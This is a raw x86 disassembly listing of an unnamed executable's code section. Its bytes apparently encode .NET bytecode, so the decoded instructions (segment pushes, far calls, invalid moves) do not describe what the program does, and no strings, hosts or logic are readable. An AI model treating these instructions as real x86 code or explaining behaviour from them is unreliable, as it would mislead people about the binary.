  402b48:	28 23                	sub    %ah,(%ebx)
  402b4a:	00 00                	add    %al,(%eax)
  402b4c:	06                   	push   %es
  402b4d:	7e 18                	jle    0x402b67
  402b4f:	00 00                	add    %al,(%eax)
  402b51:	04 6f                	add    $0x6f,%al
  402b53:	63 00                	arpl   %eax,(%eax)
  402b55:	00 0a                	add    %cl,(%edx)
  402b57:	26 17                	es pop %ss
  402b59:	2d c8 2a c6 16       	sub    $0x16c62ac8,%eax
  402b5e:	80 12 00             	adcb   $0x0,(%edx)
  402b61:	00 04 14             	add    %al,(%esp,%edx,1)
  402b64:	80 13 00             	adcb   $0x0,(%ebx)
  402b67:	00 04 16             	add    %al,(%esi,%edx,1)
  402b6a:	6a 80                	push   $0xffffff80
  402b6c:	14 00                	adc    $0x0,%al
  402b6e:	00 04 14             	add    %al,(%esp,%edx,1)
  402b71:	80 16 00             	adcb   $0x0,(%esi)
  402b74:	00 04 14             	add    %al,(%esp,%edx,1)
  402b77:	80 17 00             	adcb   $0x0,(%edi)
  402b7a:	00 04 16             	add    %al,(%esi,%edx,1)
  402b7d:	73 66                	jae    0x402be5
  402b7f:	00 00                	add    %al,(%eax)
  402b81:	0a 80 18 00 00 04    	or     0x4000018(%eax),%al
  402b87:	14 80                	adc    $0x80,%al
  402b89:	19 00                	sbb    %eax,(%eax)
  402b8b:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402b8e:	00 00                	add    %al,(%eax)
  402b90:	1e                   	push   %ds
  402b91:	02 28                	add    (%eax),%ch
  402b93:	17                   	pop    %ss
  402b94:	00 00                	add    %al,(%eax)
  402b96:	0a 2a                	or     (%edx),%ch
  402b98:	1b 30                	sbb    (%eax),%esi
  402b9a:	06                   	push   %es
  402b9b:	00 aa 00 00 00 13    	add    %ch,0x13000000(%edx)
  402ba1:	00 00                	add    %al,(%eax)
  402ba3:	11 7e 06             	adc    %edi,0x6(%esi)
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	04 17                	add    $0x17,%al
  402baa:	8d 49 00             	lea    0x0(%ecx),%ecx
  402bad:	00 01                	add    %al,(%ecx)
  402baf:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402bb2:	04 16                	add    $0x16,%al
  402bb4:	1f                   	pop    %ds
  402bb5:	2c 9d                	sub    $0x9d,%al
  402bb7:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402bba:	67 00 00             	add    %al,(%bx,%si)
  402bbd:	0a 73 61             	or     0x61(%ebx),%dh
  402bc0:	00 00                	add    %al,(%eax)
  402bc2:	0a 7e 06             	or     0x6(%esi),%bh
  402bc5:	00 00                	add    %al,(%eax)
  402bc7:	04 17                	add    $0x17,%al
  402bc9:	8d 49 00             	lea    0x0(%ecx),%ecx
  402bcc:	00 01                	add    %al,(%ecx)
  402bce:	13 05 11 05 16 1f    	adc    0x1f160511,%eax
  402bd4:	2c 9d                	sub    $0x9d,%al
  402bd6:	11 05 6f 67 00 00    	adc    %eax,0x676f
  402bdc:	0a 8e b7 6f 68 00    	or     0x686fb7(%esi),%cl
  402be2:	00 0a                	add    %cl,(%edx)
  402be4:	9a 0a 06 28 62 00 00 	lcall  $0x0,$0x6228060a
  402beb:	06                   	push   %es
  402bec:	2c 48                	sub    $0x48,%al
  402bee:	06                   	push   %es
  402bef:	28 69 00             	sub    %ch,0x0(%ecx)
  402bf2:	00 0a                	add    %cl,(%edx)
  402bf4:	0b 07                	or     (%edi),%eax
  402bf6:	13 07                	adc    (%edi),%eax
  402bf8:	16                   	push   %ss
  402bf9:	13 06                	adc    (%esi),%eax
  402bfb:	2b 2f                	sub    (%edi),%ebp
  402bfd:	11 07                	adc    %eax,(%edi)
  402bff:	11 06                	adc    %eax,(%esi)
  402c01:	9a 0c 08 6f 6a 00 00 	lcall  $0x0,$0x6a6f080c
  402c08:	0a 28                	or     (%eax),%ch
  402c0a:	24 00                	and    $0x0,%al
  402c0c:	00 06                	add    %al,(%esi)
  402c0e:	26 7e 12             	es jle 0x402c23
  402c11:	00 00                	add    %al,(%eax)
  402c13:	04 2c                	add    $0x2c,%al
  402c15:	02 de                	add    %dh,%bl
  402c17:	1c de                	sbb    $0xde,%al
  402c19:	0c 28                	or     $0x28,%al
  402c1b:	25 00 00 0a 28       	and    $0x280a0000,%eax
  402c20:	27                   	daa
  402c21:	00 00                	add    %al,(%eax)
  402c23:	0a de                	or     %dh,%bl
  402c25:	00 11                	add    %dl,(%ecx)
  402c27:	06                   	push   %es
  402c28:	17                   	pop    %ss
  402c29:	d6                   	salc
  402c2a:	13 06                	adc    (%esi),%eax
  402c2c:	11 06                	adc    %eax,(%esi)
  402c2e:	11 07                	adc    %eax,(%edi)
  402c30:	8e b7 32 c9 2b 07    	mov    0x72bc932(%edi),%?
  402c36:	06                   	push   %es
  402c37:	28 24 00             	sub    %ah,(%eax,%eax,1)
  402c3a:	00 06                	add    %al,(%esi)
  402c3c:	26 de 0e             	fimuls %es:(%esi)
  402c3f:	25 28 25 00 00       	and    $0x2528,%eax
  402c44:	0a 0d 28 27 00 00    	or     0x2728,%cl
  402c4a:	0a de                	or     %dh,%bl
  402c4c:	00 2a                	add    %ch,(%edx)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402c53:	00 00                	add    %al,(%eax)
  402c55:	00 5f 00             	add    %bl,0x0(%edi)
  402c58:	17                   	pop    %ss
  402c59:	76 00                	jbe    0x402c5b
  402c5b:	0c 29                	or     $0x29,%al
  402c5d:	00 00                	add    %al,(%eax)
  402c5f:	01 00                	add    %eax,(%eax)
  402c61:	00 00                	add    %al,(%eax)
  402c63:	00 9b 9b 00 0e 29    	add    %bl,0x290e009b(%ebx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	01 1b                	add    %ebx,(%ebx)
  402c6d:	30 07                	xor    %al,(%edi)
  402c6f:	00 30                	add    %dh,(%eax)
  402c71:	01 00                	add    %eax,(%eax)
  402c73:	00 14 00             	add    %dl,(%eax,%eax,1)
  402c76:	00 11                	add    %dl,(%ecx)
  402c78:	18 17                	sbb    %dl,(%edi)
  402c7a:	1c 73                	sbb    $0x73,%al
  402c7c:	6b 00 00             	imul   $0x0,(%eax),%eax
  402c7f:	0a 80 13 00 00 04    	or     0x4000013(%eax),%al
  402c85:	15 6a 80 14 00       	adc    $0x14806a,%eax
  402c8a:	00 04 17             	add    %al,(%edi,%edx,1)
  402c8d:	8d 4f 00             	lea    0x0(%edi),%ecx
  402c90:	00 01                	add    %al,(%ecx)
  402c92:	80 15 00 00 04 73 6c 	adcb   $0x6c,0x73040000
  402c99:	00 00                	add    %al,(%eax)
  402c9b:	0a 80 16 00 00 04    	or     0x4000016(%eax),%al
  402ca1:	7e 13                	jle    0x402cb6
  402ca3:	00 00                	add    %al,(%eax)
  402ca5:	04 20                	add    $0x20,%al
  402ca7:	00 c8                	add    %cl,%al
  402ca9:	00 00                	add    %al,(%eax)
  402cab:	6f                   	outsl  %ds:(%esi),(%dx)
  402cac:	6d                   	insl   (%dx),%es:(%edi)
  402cad:	00 00                	add    %al,(%eax)
  402caf:	0a 7e 13             	or     0x13(%esi),%bh
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	04 20                	add    $0x20,%al
  402cb6:	00 c8                	add    %cl,%al
  402cb8:	00 00                	add    %al,(%eax)
  402cba:	6f                   	outsl  %ds:(%esi),(%dx)
  402cbb:	6e                   	outsb  %ds:(%esi),(%dx)
  402cbc:	00 00                	add    %al,(%eax)
  402cbe:	0a 7e 13             	or     0x13(%esi),%bh
  402cc1:	00 00                	add    %al,(%eax)
  402cc3:	04 02                	add    $0x2,%al
  402cc5:	7e 08                	jle    0x402ccf
  402cc7:	00 00                	add    %al,(%eax)
  402cc9:	04 28                	add    $0x28,%al
  402ccb:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402cd0:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd1:	00 00                	add    %al,(%eax)
  402cd3:	0a 02                	or     (%edx),%al
  402cd5:	80 07 00             	addb   $0x0,(%edi)
  402cd8:	00 04 17             	add    %al,(%edi,%edx,1)
  402cdb:	80 12 00             	adcb   $0x0,(%edx)
  402cde:	00 04 73             	add    %al,(%ebx,%esi,2)
  402ce1:	17                   	pop    %ss
  402ce2:	00 00                	add    %al,(%eax)
  402ce4:	0a 28                	or     (%eax),%ch
  402ce6:	11 00                	adc    %eax,(%eax)
  402ce8:	00 0a                	add    %cl,(%edx)
  402cea:	80 19 00             	sbbb   $0x0,(%ecx)
  402ced:	00 04 28             	add    %al,(%eax,%ebp,1)
  402cf0:	25 00 00 06 28       	and    $0x28060000,%eax
  402cf5:	23 00                	and    (%eax),%eax
  402cf7:	00 0a                	add    %cl,(%edx)
  402cf9:	28 2f                	sub    %ch,(%edi)
  402cfb:	00 00                	add    %al,(%eax)
  402cfd:	06                   	push   %es
  402cfe:	16                   	push   %ss
  402cff:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  402d03:	04 7e                	add    $0x7e,%al
  402d05:	13 00                	adc    (%eax),%eax
  402d07:	00 04 7e             	add    %al,(%esi,%edi,2)
  402d0a:	15 00 00 04 16       	adc    $0x16040000,%eax
  402d0f:	7e 15                	jle    0x402d26
  402d11:	00 00                	add    %al,(%eax)
  402d13:	04 8e                	add    $0x8e,%al
  402d15:	b7 16                	mov    $0x16,%bh
  402d17:	14 fe                	adc    $0xfe,%al
  402d19:	06                   	push   %es
  402d1a:	2d 00 00 06 73       	sub    $0x73060000,%eax
  402d1f:	70 00                	jo     0x402d21
  402d21:	00 0a                	add    %cl,(%edx)
  402d23:	14 6f                	adc    $0x6f,%al
  402d25:	71 00                	jno    0x402d27
  402d27:	00 0a                	add    %cl,(%edx)
  402d29:	26 14 fe             	es adc $0xfe,%al
  402d2c:	06                   	push   %es
  402d2d:	34 00                	xor    $0x0,%al
  402d2f:	00 06                	add    %al,(%esi)
  402d31:	73 72                	jae    0x402da5
  402d33:	00 00                	add    %al,(%eax)
  402d35:	0a 0b                	or     (%ebx),%cl
  402d37:	07                   	pop    %es
  402d38:	14 73                	adc    $0x73,%al
  402d3a:	61                   	popa
  402d3b:	00 00                	add    %al,(%eax)
  402d3d:	0a 20                	or     (%eax),%ah
  402d3f:	10 27                	adc    %ah,(%edi)
  402d41:	00 00                	add    %al,(%eax)
  402d43:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402d49:	62 00                	bound  %eax,(%eax)
  402d4b:	00 0a                	add    %cl,(%edx)
  402d4d:	73 61                	jae    0x402db0
  402d4f:	00 00                	add    %al,(%eax)
  402d51:	0a 20                	or     (%eax),%ah
  402d53:	10 27                	adc    %ah,(%edi)
  402d55:	00 00                	add    %al,(%eax)
  402d57:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402d5d:	62 00                	bound  %eax,(%eax)
  402d5f:	00 0a                	add    %cl,(%edx)
  402d61:	73 73                	jae    0x402dd6
  402d63:	00 00                	add    %al,(%eax)
  402d65:	0a 80 17 00 00 04    	or     0x4000017(%eax),%al
  402d6b:	14 fe                	adc    $0xfe,%al
  402d6d:	06                   	push   %es
  402d6e:	32 00                	xor    (%eax),%al
  402d70:	00 06                	add    %al,(%esi)
  402d72:	73 72                	jae    0x402de6
  402d74:	00 00                	add    %al,(%eax)
  402d76:	0a 14 17             	or     (%edi,%edx,1),%dl
  402d79:	17                   	pop    %ss
  402d7a:	73 73                	jae    0x402def
  402d7c:	00 00                	add    %al,(%eax)
  402d7e:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402d84:	de 20                	fisubs (%eax)
  402d86:	25 28 25 00 00       	and    $0x2528,%eax
  402d8b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402d8e:	80 12 00             	adcb   $0x0,(%edx)
  402d91:	00 04 28             	add    %al,(%eax,%ebp,1)
  402d94:	27                   	daa
  402d95:	00 00                	add    %al,(%eax)
  402d97:	0a de                	or     %dh,%bl
  402d99:	0c 7e                	or     $0x7e,%al
  402d9b:	18 00                	sbb    %al,(%eax)
  402d9d:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402da0:	74 00                	je     0x402da2
  402da2:	00 0a                	add    %cl,(%edx)
  402da4:	26 dc 06             	faddl  %es:(%esi)
  402da7:	2a 41 34             	sub    0x34(%ecx),%al
	...
  402db2:	00 00                	add    %al,(%eax)
  402db4:	0e                   	push   %cs
  402db5:	01 00                	add    %eax,(%eax)
  402db7:	00 0e                	add    %cl,(%esi)
  402db9:	01 00                	add    %eax,(%eax)
  402dbb:	00 14 00             	add    %dl,(%eax,%eax,1)
  402dbe:	00 00                	add    %al,(%eax)
  402dc0:	29 00                	sub    %eax,(%eax)
  402dc2:	00 01                	add    %al,(%ecx)
  402dc4:	02 00                	add    (%eax),%al
  402dc6:	00 00                	add    %al,(%eax)
  402dc8:	00 00                	add    %al,(%eax)
  402dca:	00 00                	add    %al,(%eax)
  402dcc:	22 01                	and    (%ecx),%al
  402dce:	00 00                	add    %al,(%eax)
  402dd0:	22 01                	and    (%ecx),%al
  402dd2:	00 00                	add    %al,(%eax)
  402dd4:	0c 00                	or     $0x0,%al
  402dd6:	00 00                	add    %al,(%eax)
  402dd8:	00 00                	add    %al,(%eax)
  402dda:	00 00                	add    %al,(%eax)
  402ddc:	13 30                	adc    (%eax),%esi
  402dde:	05 00 58 01 00       	add    $0x15800,%eax
  402de3:	00 15 00 00 11 73    	add    %dl,0x73110000
  402de9:	54                   	push   %esp
  402dea:	00 00                	add    %al,(%eax)
  402dec:	0a 0b                	or     (%ebx),%cl
  402dee:	1f                   	pop    %ds
  402def:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  402df5:	0d 09 16 72 33       	or     $0x33721609,%eax
  402dfa:	06                   	push   %es
  402dfb:	00 70 a2             	add    %dh,-0x5e(%eax)
  402dfe:	09 17                	or     %edx,(%edi)
  402e00:	7e 0a                	jle    0x402e0c
  402e02:	00 00                	add    %al,(%eax)
  402e04:	04 a2                	add    $0xa2,%al
  402e06:	09 18                	or     %ebx,(%eax)
  402e08:	28 6e 00             	sub    %ch,0x0(%esi)
  402e0b:	00 06                	add    %al,(%esi)
  402e0d:	a2 09 19 7e 0a       	mov    %al,0xa7e1909
  402e12:	00 00                	add    %al,(%eax)
  402e14:	04 a2                	add    $0xa2,%al
  402e16:	09 1a                	or     %ebx,(%edx)
  402e18:	28 75 00             	sub    %dh,0x0(%ebp)
  402e1b:	00 0a                	add    %cl,(%edx)
  402e1d:	a2 09 1b 7e 0a       	mov    %al,0xa7e1b09
  402e22:	00 00                	add    %al,(%eax)
  402e24:	04 a2                	add    $0xa2,%al
  402e26:	09 1c 07             	or     %ebx,(%edi,%eax,1)
  402e29:	6f                   	outsl  %ds:(%esi),(%dx)
  402e2a:	55                   	push   %ebp
  402e2b:	00 00                	add    %al,(%eax)
  402e2d:	0a 72 3d             	or     0x3d(%edx),%dh
  402e30:	06                   	push   %es
  402e31:	00 70 14             	add    %dh,0x14(%eax)
  402e34:	6f                   	outsl  %ds:(%esi),(%dx)
  402e35:	76 00                	jbe    0x402e37
  402e37:	00 0a                	add    %cl,(%edx)
  402e39:	a2 09 1d 28 77       	mov    %al,0x77281d09
  402e3e:	00 00                	add    %al,(%eax)
  402e40:	0a 6f 78             	or     0x78(%edi),%ch
  402e43:	00 00                	add    %al,(%eax)
  402e45:	0a 72 51             	or     0x51(%edx),%dh
  402e48:	06                   	push   %es
  402e49:	00 70 72             	add    %dh,0x72(%eax)
  402e4c:	6b 06 00             	imul   $0x0,(%esi),%eax
  402e4f:	70 6f                	jo     0x402ec0
  402e51:	76 00                	jbe    0x402e53
  402e53:	00 0a                	add    %cl,(%edx)
  402e55:	72 71                	jb     0x402ec8
  402e57:	06                   	push   %es
  402e58:	00 70 28             	add    %dh,0x28(%eax)
  402e5b:	1f                   	pop    %ds
  402e5c:	00 00                	add    %al,(%eax)
  402e5e:	0a a2 09 1e 28 79    	or     0x79281e09(%edx),%ah
  402e64:	00 00                	add    %al,(%eax)
  402e66:	0a 0c 12             	or     (%edx,%edx,1),%cl
  402e69:	02 28                	add    (%eax),%ch
  402e6b:	7a 00                	jp     0x402e6d
  402e6d:	00 0a                	add    %cl,(%edx)
  402e6f:	72 75                	jb     0x402ee6
  402e71:	06                   	push   %es
  402e72:	00 70 72             	add    %dh,0x72(%eax)
  402e75:	81 06 00 70 6f 76    	addl   $0x766f7000,(%esi)
  402e7b:	00 00                	add    %al,(%eax)
  402e7d:	0a 72 8d             	or     -0x73(%edx),%dh
  402e80:	06                   	push   %es
  402e81:	00 70 72             	add    %dh,0x72(%eax)
  402e84:	97                   	xchg   %eax,%edi
  402e85:	06                   	push   %es
  402e86:	00 70 6f             	add    %dh,0x6f(%eax)
  402e89:	76 00                	jbe    0x402e8b
  402e8b:	00 0a                	add    %cl,(%edx)
  402e8d:	a2 09 1f 09 7e       	mov    %al,0x7e091f09
  402e92:	0a 00                	or     (%eax),%al
  402e94:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402e97:	09 1f                	or     %ebx,(%edi)
  402e99:	0a 7e 0c             	or     0xc(%esi),%bh
  402e9c:	00 00                	add    %al,(%eax)
  402e9e:	04 a2                	add    $0xa2,%al
  402ea0:	09 1f                	or     %ebx,(%edi)
  402ea2:	0b 7e 0a             	or     0xa(%esi),%edi
  402ea5:	00 00                	add    %al,(%eax)
  402ea7:	04 a2                	add    $0xa2,%al
  402ea9:	09 1f                	or     %ebx,(%edi)
  402eab:	0c 28                	or     $0x28,%al
  402ead:	26 00 00             	add    %al,%es:(%eax)
  402eb0:	06                   	push   %es
  402eb1:	a2 09 1f 0d 7e       	mov    %al,0x7e0d1f09
  402eb6:	0a 00                	or     (%eax),%al
  402eb8:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402ebb:	09 1f                	or     %ebx,(%edi)
  402ebd:	0e                   	push   %cs
  402ebe:	28 27                	sub    %ah,(%edi)
  402ec0:	00 00                	add    %al,(%eax)
  402ec2:	06                   	push   %es
  402ec3:	a2 09 1f 0f 7e       	mov    %al,0x7e0f1f09
  402ec8:	0a 00                	or     (%eax),%al
  402eca:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402ecd:	09 1f                	or     %ebx,(%edi)
  402ecf:	10 28                	adc    %ch,(%eax)
  402ed1:	28 00                	sub    %al,(%eax)
  402ed3:	00 06                	add    %al,(%esi)
  402ed5:	a2 09 1f 11 7e       	mov    %al,0x7e111f09
  402eda:	0a 00                	or     (%eax),%al
  402edc:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402edf:	09 1f                	or     %ebx,(%edi)
  402ee1:	12 28                	adc    (%eax),%ch
  402ee3:	40                   	inc    %eax
  402ee4:	00 00                	add    %al,(%eax)
  402ee6:	06                   	push   %es
  402ee7:	8c 38                	mov    %?,(%eax)
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	01 a2 09 1f 13 7e    	add    %esp,0x7e131f09(%edx)
  402ef1:	0a 00                	or     (%eax),%al
  402ef3:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402ef6:	09 1f                	or     %ebx,(%edi)
  402ef8:	14 28                	adc    $0x28,%al
  402efa:	2b 00                	sub    (%eax),%eax
  402efc:	00 06                	add    %al,(%esi)
  402efe:	a2 09 1f 15 7e       	mov    %al,0x7e151f09
  402f03:	0a 00                	or     (%eax),%al
  402f05:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402f08:	09 1f                	or     %ebx,(%edi)
  402f0a:	16                   	push   %ss
  402f0b:	28 2a                	sub    %ch,(%edx)
  402f0d:	00 00                	add    %al,(%eax)
  402f0f:	06                   	push   %es
  402f10:	a2 09 1f 17 7e       	mov    %al,0x7e171f09
  402f15:	0a 00                	or     (%eax),%al
  402f17:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402f1a:	09 1f                	or     %ebx,(%edi)
  402f1c:	18 28                	sbb    %ch,(%eax)
  402f1e:	2c 00                	sub    $0x0,%al
  402f20:	00 06                	add    %al,(%esi)
  402f22:	a2 09 1f 19 7e       	mov    %al,0x7e191f09
  402f27:	0a 00                	or     (%eax),%al
  402f29:	00 04 a2             	add    %al,(%edx,%eiz,4)
  402f2c:	09 1f                	or     %ebx,(%edi)
  402f2e:	1a 28                	sbb    (%eax),%ch
  402f30:	29 00                	sub    %eax,(%eax)
  402f32:	00 06                	add    %al,(%esi)
  402f34:	a2 09 28 7b 00       	mov    %al,0x7b2809
  402f39:	00 0a                	add    %cl,(%edx)
  402f3b:	0a 2b                	or     (%ebx),%ch
  402f3d:	00 06                	add    %al,(%esi)
  402f3f:	2a 1b                	sub    (%ebx),%bl
  402f41:	30 02                	xor    %al,(%edx)
  402f43:	00 40 00             	add    %al,0x0(%eax)
  402f46:	00 00                	add    %al,(%eax)
  402f48:	16                   	push   %ss
  402f49:	00 00                	add    %al,(%eax)
  402f4b:	11 7e 2c             	adc    %edi,0x2c(%esi)
  402f4e:	00 00                	add    %al,(%eax)
  402f50:	04 73                	add    $0x73,%al
  402f52:	29 00                	sub    %eax,(%eax)
  402f54:	00 0a                	add    %cl,(%edx)
  402f56:	0b 07                	or     (%edi),%eax
  402f58:	6f                   	outsl  %ds:(%esi),(%dx)
  402f59:	7c 00                	jl     0x402f5b
  402f5b:	00 0a                	add    %cl,(%edx)
  402f5d:	0d 12 03 72 a3       	or     $0xa3720312,%eax
  402f62:	06                   	push   %es
  402f63:	00 70 28             	add    %dh,0x28(%eax)
  402f66:	7d 00                	jge    0x402f68
  402f68:	00 0a                	add    %cl,(%edx)
  402f6a:	0a de                	or     %dh,%bl
  402f6c:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  402f71:	25 00 00 0a 0c       	and    $0xc0a0000,%eax
  402f76:	72 b7                	jb     0x402f2f
  402f78:	06                   	push   %es
  402f79:	00 70 0a             	add    %dh,0xa(%eax)
  402f7c:	28 27                	sub    %ah,(%edi)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	0a de                	or     %dh,%bl
  402f82:	07                   	pop    %es
  402f83:	28 27                	sub    %ah,(%edi)
  402f85:	00 00                	add    %al,(%eax)
  402f87:	0a de                	or     %dh,%bl
  402f89:	00 06                	add    %al,(%esi)
  402f8b:	2a 01                	sub    (%ecx),%al
  402f8d:	10 00                	adc    %al,(%eax)
  402f8f:	00 00                	add    %al,(%eax)
  402f91:	00 00                	add    %al,(%eax)
  402f93:	00 23                	add    %ah,(%ebx)
  402f95:	23 00                	and    (%eax),%eax
  402f97:	1b 29                	sbb    (%ecx),%ebp
  402f99:	00 00                	add    %al,(%eax)
  402f9b:	01 1b                	add    %ebx,(%ebx)
  402f9d:	30 03                	xor    %al,(%ebx)
  402f9f:	00 49 00             	add    %cl,0x0(%ecx)
  402fa2:	00 00                	add    %al,(%eax)
  402fa4:	17                   	pop    %ss
  402fa5:	00 00                	add    %al,(%eax)
  402fa7:	11 7e 2c             	adc    %edi,0x2c(%esi)
  402faa:	00 00                	add    %al,(%eax)
  402fac:	04 28                	add    $0x28,%al
  402fae:	4f                   	dec    %edi
  402faf:	00 00                	add    %al,(%eax)
  402fb1:	0a 7e 0d             	or     0xd(%esi),%bh
  402fb4:	00 00                	add    %al,(%eax)
  402fb6:	04 16                	add    $0x16,%al
  402fb8:	28 5b 00             	sub    %bl,0x0(%ebx)
  402fbb:	00 0a                	add    %cl,(%edx)
  402fbd:	16                   	push   %ss
  402fbe:	33 0a                	xor    (%edx),%ecx
  402fc0:	72 8d                	jb     0x402f4f
  402fc2:	06                   	push   %es
  402fc3:	00 70 0a             	add    %dh,0xa(%eax)
  402fc6:	de 27                	fisubs (%edi)
  402fc8:	2b 08                	sub    (%eax),%ecx
  402fca:	72 75                	jb     0x403041
  402fcc:	06                   	push   %es
  402fcd:	00 70 0a             	add    %dh,0xa(%eax)
  402fd0:	de 1d de 1b 25 28    	ficomps 0x28251bde
  402fd6:	25 00 00 0a 0b       	and    $0xb0a0000,%eax
  402fdb:	72 b7                	jb     0x402f94
  402fdd:	06                   	push   %es
  402fde:	00 70 0a             	add    %dh,0xa(%eax)
  402fe1:	28 27                	sub    %ah,(%edi)
  402fe3:	00 00                	add    %al,(%eax)
  402fe5:	0a de                	or     %dh,%bl
  402fe7:	07                   	pop    %es
  402fe8:	28 27                	sub    %ah,(%edi)
  402fea:	00 00                	add    %al,(%eax)
  402fec:	0a de                	or     %dh,%bl
  402fee:	00 06                	add    %al,(%esi)
  402ff0:	2a 00                	sub    (%eax),%al
  402ff2:	00 00                	add    %al,(%eax)
  402ff4:	01 10                	add    %edx,(%eax)
  402ff6:	00 00                	add    %al,(%eax)
  402ff8:	00 00                	add    %al,(%eax)
  402ffa:	00 00                	add    %al,(%eax)
  402ffc:	2c 2c                	sub    $0x2c,%al
  402ffe:	00 1b                	add    %bl,(%ebx)
  403000:	29 00                	sub    %eax,(%eax)
  403002:	00 01                	add    %al,(%ecx)
  403004:	1b 30                	sbb    (%eax),%esi
  403006:	02 00                	add    (%eax),%al
  403008:	3e 00 00             	add    %al,%ds:(%eax)
  40300b:	00 18                	add    %bl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	11 28                	adc    %ebp,(%eax)
  403011:	7e 00                	jle    0x403013
  403013:	00 0a                	add    %cl,(%edx)
  403015:	73 7f                	jae    0x403096
  403017:	00 00                	add    %al,(%eax)
  403019:	0a 20                	or     (%eax),%ah
  40301b:	20 02                	and    %al,(%edx)
  40301d:	00 00                	add    %al,(%eax)
  40301f:	6f                   	outsl  %ds:(%esi),(%dx)
  403020:	80 00 00             	addb   $0x0,(%eax)
  403023:	0a 0c 12             	or     (%edx,%edx,1),%cl
  403026:	02 28                	add    (%eax),%ch
  403028:	7a 00                	jp     0x40302a
  40302a:	00 0a                	add    %cl,(%edx)
  40302c:	0a de                	or     %dh,%bl
  40302e:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  403033:	25 00 00 0a 0b       	and    $0xb0a0000,%eax
  403038:	72 b7                	jb     0x402ff1
  40303a:	06                   	push   %es
  40303b:	00 70 0a             	add    %dh,0xa(%eax)
  40303e:	28 27                	sub    %ah,(%edi)
  403040:	00 00                	add    %al,(%eax)
  403042:	0a de                	or     %dh,%bl
  403044:	07                   	pop    %es
  403045:	28 27                	sub    %ah,(%edi)
  403047:	00 00                	add    %al,(%eax)
  403049:	0a de                	or     %dh,%bl
  40304b:	00 06                	add    %al,(%esi)
  40304d:	2a 00                	sub    (%eax),%al
  40304f:	00 01                	add    %al,(%ecx)
  403051:	10 00                	adc    %al,(%eax)
  403053:	00 00                	add    %al,(%eax)
  403055:	00 00                	add    %al,(%eax)
  403057:	00 21                	add    %ah,(%ecx)
  403059:	21 00                	and    %eax,(%eax)
  40305b:	1b 29                	sbb    (%ecx),%ebp
  40305d:	00 00                	add    %al,(%eax)
  40305f:	01 1b                	add    %ebx,(%ebx)
  403061:	30 04 00             	xor    %al,(%eax,%eax,1)
  403064:	cf                   	iret
  403065:	00 00                	add    %al,(%eax)
  403067:	00 19                	add    %bl,(%ecx)
  403069:	00 00                	add    %al,(%eax)
  40306b:	11 72 c3             	adc    %esi,-0x3d(%edx)
  40306e:	06                   	push   %es
  40306f:	00 70 28             	add    %dh,0x28(%eax)
  403072:	81 00 00 0a 72 c9    	addl   $0xc9720a00,(%eax)
  403078:	06                   	push   %es
  403079:	00 70 28             	add    %dh,0x28(%eax)
  40307c:	28 00                	sub    %al,(%eax)
  40307e:	00 0a                	add    %cl,(%edx)
  403080:	72 f5                	jb     0x403077
  403082:	06                   	push   %es
  403083:	00 70 73             	add    %dh,0x73(%eax)
  403086:	82 00 00             	addb   $0x0,(%eax)
  403089:	0a 0b                	or     (%ebx),%cl
  40308b:	73 83                	jae    0x403010
  40308d:	00 00                	add    %al,(%eax)
  40308f:	0a 0c 07             	or     (%edi,%eax,1),%cl
  403092:	6f                   	outsl  %ds:(%esi),(%dx)
  403093:	84 00                	test   %al,(%eax)
  403095:	00 0a                	add    %cl,(%edx)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	85 00                	test   %eax,(%eax)
  40309a:	00 0a                	add    %cl,(%edx)
  40309c:	13 05 2b 2b 11 05    	adc    0x5112b2b,%eax
  4030a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a3:	86 00                	xchg   %al,(%eax)
  4030a5:	00 0a                	add    %cl,(%edx)
  4030a7:	0d 08 09 72 33       	or     $0x33720908,%eax
  4030ac:	07                   	pop    %es
  4030ad:	00 70 6f             	add    %dh,0x6f(%eax)
  4030b0:	87 00                	xchg   %eax,(%eax)
  4030b2:	00 0a                	add    %cl,(%edx)
  4030b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b5:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4030ba:	88 00                	mov    %al,(%eax)
  4030bc:	00 0a                	add    %cl,(%edx)
  4030be:	26 08 72 4b          	or     %dh,%es:0x4b(%edx)
  4030c2:	07                   	pop    %es
  4030c3:	00 70 6f             	add    %dh,0x6f(%eax)
  4030c6:	88 00                	mov    %al,(%eax)
  4030c8:	00 0a                	add    %cl,(%edx)
  4030ca:	26 11 05 6f 89 00 00 	adc    %eax,%es:0x896f
  4030d1:	0a 2d cc de 0c 11    	or     0x110cdecc,%ch
  4030d7:	05 2c 07 11 05       	add    $0x511072c,%eax
  4030dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4030dd:	5e                   	pop    %esi
  4030de:	00 00                	add    %al,(%eax)
  4030e0:	0a dc                	or     %ah,%bl
  4030e2:	08 6f 8a             	or     %ch,-0x76(%edi)
  4030e5:	00 00                	add    %al,(%eax)
